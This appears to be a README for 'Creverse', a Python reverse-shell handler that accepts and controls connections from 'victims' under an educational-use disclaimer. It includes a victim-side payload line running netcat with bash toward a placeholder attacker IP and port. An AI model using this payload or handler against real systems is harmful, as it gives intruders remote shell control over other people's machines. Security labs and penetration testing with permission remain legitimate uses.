#  Creverse 

Advanced Reverse Shell Handler with Beautiful ASCII Art Interface

##  Description

This tool allows you to receive connections from victims (reverse shell) via TCP. The tool is designed for educational and ethical testing purposes only.

##  Important Warning

**This tool is for educational and ethical testing purposes only!**

- Do not use it for any malicious or illegal purposes
- Use it only in isolated testing environments
- Get written permission before testing any systems

##  Features

-  Beautiful ASCII art interface with colors
-  Multi-connection support
-  Active connections display
-  Victim control
-  Event logging
-  Easy configuration
-  Comprehensive error handling

##  Requirements

- Python 3.6+
- Operating system that supports Python

##  Installation

1. **Clone the project:**
```bash
git clone <repository-url>
cd creverse
```

2. **Install Python:**
```bash
# Windows
# Download from https://python.org

# Linux/macOS
sudo apt-get install python3  # Ubuntu/Debian
brew install python3          # macOS
```

3. **Run the tool:**
```bash
python3 reverse_shell_handler.py
```

##  How to Use

### 1. Start Server
- Choose option `[1]` from the menu
- Enter IP address (or leave empty for 0.0.0.0)
- Enter port number (example: 4444)

### 2. Wait for Connections
- Server will start listening
- Wait for victim to connect

### 3. Control Victim
- Choose option `[3]` for control
- Select connection ID
- Type commands (example: `dir`, `whoami`, `ipconfig`)

### 4. Manage Connections
- Option `[2]` to show active connections
- Option `[4]` to show event log
- Option `[5]` to stop server

##  Usage Example

### On Attacker Machine:
```bash
python3 reverse_shell_handler.py
# Choose [1] and enter IP:PORT
# Wait for connection
```

### On Victim Machine:
```bash
# Simple payload example
nc -e /bin/bash [ATTACKER_IP] [PORT]
```

##  Project Structure

```
creverse/
├── reverse_shell_handler.py    # Main handler
├── payload_generator.py        # Payload generator
├── README.md                   # This file
└── requirements.txt            # Requirements (optional)
```

##  Technical Features

- **Multi-threading**: Multi-connection support
- **Socket Programming**: Advanced network programming
- **Error Handling**: Comprehensive error handling
- **Color Support**: Terminal color support
- **Connection Management**: Connection management
- **Event Logging**: Event logging

##  Security

- Tool only receives TCP connections
- No known security vulnerabilities
- Designed for use in isolated environments
- Does not send any external data

##  Troubleshooting

### Issue: "Address already in use"
```bash
# Use different port
# Or stop service using the port
```

### Issue: "Permission denied"
```bash
# Ensure you have sufficient permissions
# Try running as administrator/root
```

### Issue: Colors not showing
```bash
# Ensure terminal supports colors
# Try different terminal
```

## Additional Resources

- [Python Socket Programming](https://docs.python.org/3/library/socket.html)
- [Network Security](https://owasp.org/)
- [Ethical Hacking](https://www.ec-council.org/)

##  Contributing

We welcome contributions! Please:
- Fork the project
- Create new branch
- Send Pull Request

##  License

This project is open source and available under MIT license.

##  Support

If you encounter any issues:
- Check troubleshooting section
- Search in Issues
- Create new Issue

##  Acknowledgments

- Cybersecurity community
- Python developers
- All contributors

---

**Remember: Responsible use only! **
